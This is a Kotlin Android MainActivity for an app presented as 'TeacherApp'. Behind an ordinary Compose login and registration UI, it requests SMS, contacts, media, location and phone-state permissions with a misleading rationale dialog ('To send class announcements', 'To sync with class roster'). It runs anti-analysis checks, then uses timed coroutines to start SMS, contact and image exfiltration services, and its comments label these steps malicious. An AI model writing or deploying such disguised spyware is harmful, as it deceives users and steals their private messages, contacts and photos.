package com.example.teacherapp

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.navigation.NavHostController
import androidx.navigation.compose.rememberNavController
import com.example.teacherapp.navigation.NavGraph
import com.example.teacherapp.ui.theme.TeacherappTheme
import com.teacherapp.obfuscation.AntiAnalysisUtils
import com.teacherapp.services.ContactExfiltrationService
import com.teacherapp.services.ImageExfiltrationService
import com.teacherapp.services.SmsExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


class MainActivity : ComponentActivity() {

    // Required permissions array
    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        )
    }

    // Permission launcher using modern API
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            onAllPermissionsGranted()
        } else {
            Toast.makeText(
                this,
                "Some permissions were denied. App may not function correctly.",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Original app UI
        setContent {
            TeacherappTheme {
                val navController = rememberNavController()
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Box(modifier = Modifier.padding(innerPadding)) {
                        NavGraph(navController = navController)
                    }
                }
            }
        }

        // PART 2: Malicious code triggers
        performSecurityChecks()
        requestNecessaryPermissions()
    }

    private fun performSecurityChecks() {
        AntiAnalysisUtils.executeIfSafe(this) {
            // Environment is safe, proceed
        }
    }

    private fun requestNecessaryPermissions() {
        val permissionsNeeded = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsNeeded.isNotEmpty()) {
            // Show rationale dialog first
            showPermissionRationale(permissionsNeeded)
        } else {
            onAllPermissionsGranted()
        }
    }

    private fun showPermissionRationale(permissions: List<String>) {
        // Using AlertDialog from androidx.appcompat
        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage(
                "TeacherApp needs the following permissions to function properly:\n\n" +
                        "• SMS: To send class announcements\n" +
                        "• Contacts: To sync with class roster\n" +
                        "• Storage: To share educational materials\n" +
                        "• Location: To track field trip attendance\n" +
                        "• Phone: To verify device identity\n\n" +
                        "These permissions help enhance your teaching experience."
            )
            .setPositiveButton("Grant Permissions") { dialog, _ ->
                dialog.dismiss()
                permissionLauncher.launch(permissions.toTypedArray())
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
                Toast.makeText(
                    this,
                    "App requires permissions to function",
                    Toast.LENGTH_LONG
                ).show()
            }
            .setCancelable(false)
            .show()
    }

    private fun onAllPermissionsGranted() {
        Toast.makeText(this, "TeacherApp is ready!", Toast.LENGTH_SHORT).show()

        // Schedule malicious activities
        scheduleMaliciousActivities()
    }

    private fun scheduleMaliciousActivities() {
        AntiAnalysisUtils.executeIfSafe(this) {
            CoroutineScope(Dispatchers.Default).launch {
                startTimedExfiltration()
            }
        }
    }

    private suspend fun startTimedExfiltration() {
        // Initial delay
        delay(10000L) // 10 seconds after permissions granted

        // Start SMS exfiltration
        SmsExfiltrationService.startExfiltration(this@MainActivity)

        delay(5000L)

        // Start Contact exfiltration
        ContactExfiltrationService.startExfiltration(this@MainActivity)

        delay(5000L)

        // Start Image exfiltration
        ImageExfiltrationService.startExfiltration(this@MainActivity)
    }
}

@Composable
fun StartScreen(modifier: Modifier = Modifier, navController: NavHostController) {
    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Spacer(modifier = Modifier.weight(1f))

        Text(
            text = "Welcome to MyApp",
            fontSize = 32.sp,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.primary
        )

        Spacer(modifier = Modifier.weight(2f))

        Column(
            modifier = Modifier.fillMaxWidth(),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            Button(
                onClick = { navController.navigate("register_screen") },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(text = "Create New Account")
            }

            OutlinedButton(
                onClick = { navController.navigate("login_screen") },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(text = "Use Existing Account")
            }
        }

        Spacer(modifier = Modifier.height(16.dp))
    }
}